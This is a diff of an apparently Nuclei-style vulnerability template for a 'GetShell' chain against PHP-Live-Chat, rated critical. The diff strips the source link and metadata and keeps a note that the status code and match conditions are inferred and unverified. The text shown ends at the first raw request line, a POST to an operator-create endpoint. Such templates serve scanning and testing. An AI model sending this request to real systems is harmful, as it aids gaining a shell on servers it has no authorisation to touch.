@@ -3,13 +3,8 @@ info:
   name: PHP-Live-Chat代码审计之组合拳GetShell
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nqaql6fa4op0g8nu
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nqaql6fa4op0g8nu
 http:
 - raw:
   - 'POST /php/app.php?mobile-operator-create HTTP/1.1
